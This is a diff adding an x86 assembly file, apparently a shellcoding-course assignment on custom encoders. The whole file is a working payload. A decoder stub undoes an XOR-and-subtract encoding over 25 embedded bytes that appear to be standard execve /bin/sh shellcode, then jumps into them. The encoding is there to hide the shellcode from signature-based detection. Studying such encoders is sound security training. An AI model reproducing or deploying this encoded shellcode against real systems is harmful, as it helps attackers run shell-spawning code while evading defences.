@@ -1,0 +1,27 @@
+; SLAE-XXX
+; assignemnt: create a custom encoding scheme like Insertion Encoder 
+; originality: copy paste , need to make it 
+
+
+
+global _start			
+
+section .text
+_start:
+
+	jmp short call_decoder
+
+decoder:
+	pop esi
+	xor ecx, ecx
+	mov cl,25
+decode:
+	xor byte[esi], 0xca
+	sub byte[esi], 0x2
+	inc esi
+	loop decode
+	jmp short Shellcode
+
+call_decoder:
+	call decoder
+	Shellcode: db 0xf9,0x08,0x98,0xa0,0xba,0xfb,0xbf,0xa0,0xa0,0xfb,0xfb,0xae,0xa1,0x41,0x2f,0x98,0x41,0x2e,0x9f,0x41,0x29,0x78,0xc7,0x05,0x48
